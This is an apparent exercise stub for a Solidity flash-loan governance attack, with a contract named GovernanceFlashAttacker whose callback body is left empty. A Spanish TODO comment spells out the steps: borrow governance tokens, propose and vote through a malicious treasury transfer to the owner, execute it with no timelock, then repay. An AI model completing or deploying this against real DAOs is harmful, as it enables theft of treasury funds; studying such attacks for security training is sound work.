// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGovToken {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IGovernor {
    function propose(address target, bytes calldata data) external returns (uint256 id);
    function vote(uint256 id) external;
    function execute(uint256 id) external;
}

interface IFlashLender {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

contract GovernanceFlashAttacker is IFlashBorrower {
    IGovernor public immutable governor;
    address public immutable treasury;
    IFlashLender public immutable lender;
    IGovToken public immutable govToken;
    address public immutable owner;

    constructor(address _governor, address _treasury, address _lender, address _govToken) {
        governor = IGovernor(_governor);
        treasury = _treasury;
        lender = IFlashLender(_lender);
        govToken = IGovToken(_govToken);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        lender.flashLoan(flashAmount, "");
    }

    // TODO: aquí vive el exploit, dentro del callback del flash loan (ya
    // tienes `amount` GOV token prestado, de sobra para superar el quorum).
    // En este orden:
    //   1. Codifica una llamada maliciosa a treasury.transferOut(owner, ...)
    //      con abi.encodeWithSignature("transferOut(address,uint256)", ...).
    //   2. governor.propose(treasury, esaLlamada) -- guarda el id devuelto.
    //   3. governor.vote(id) -- tu poder de voto es el balance que acabas
    //      de recibir del flash loan.
    //   4. governor.execute(id) -- sin ningún timelock, se ejecuta ya.
    //   5. Devuelve el préstamo: govToken.transfer(address(lender), amount).
    function onFlashLoan(uint256 amount, bytes calldata) external override {
        // completa aquí
    }
}
